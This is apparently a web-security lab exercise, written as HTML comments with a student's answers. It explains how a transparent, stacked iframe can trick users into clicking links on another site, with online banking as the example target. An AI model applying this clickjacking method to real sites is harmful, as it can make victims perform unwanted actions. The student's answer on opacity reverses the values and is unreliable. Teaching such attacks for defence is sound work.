<!--
The goal of this exercise is to create a special crafted web site
to trick a user clicking on a button or a link in another web site.
This is called a clickjacking attack.

Note that the target web site could be an online banking system where the
user is logged-in and the link could trigger a transaction.

<!-- Step 1.
Replace "yyyy" with a URL to a foreign website which will
then be included into this page using an iframe.

Note that most web sites today can not be included in an iframe, 
because they are protected to do so. We will show later how
this protection meachanism works (X-frame-options Header).

A web site which should work here is for example https://www.w3.org
-->

<!-- Step 2.
Replace "xxxx" with a nice picture. The picture is used to trick a user
visiting this web page to click on it.

Example picture: https://www.ischi.net/ost/misc/bunny-1149060_960_720.jpg

-->

<!-- Step 3
Try to click on a link in the target website "trough" the picture. Does it work? ANSWER: yes (cause iFrame is placed on top via z-index)

What happens when you reduce the CSS parameter opacity? What the purpose of this property?
Your answer: opacity defines the transparency. Set to 0, we can't see through the image, set to 1 and we don't see the image at all. 

Whats the purpose of the two CSS properties z-index?
Your answer: z-index defines how (overlapping) html elements are stacked on top of each other. The user only sees the html on top (aka having the highest z-index) unless 
opacity is defined. 

In this example: we want the user to click on a link in the iFrame site (here https://www.w3.org). The site itself is placed on "top" via z-index but made transparent so we can see "our" html that lures the user into clicking on a certain link in the iframe
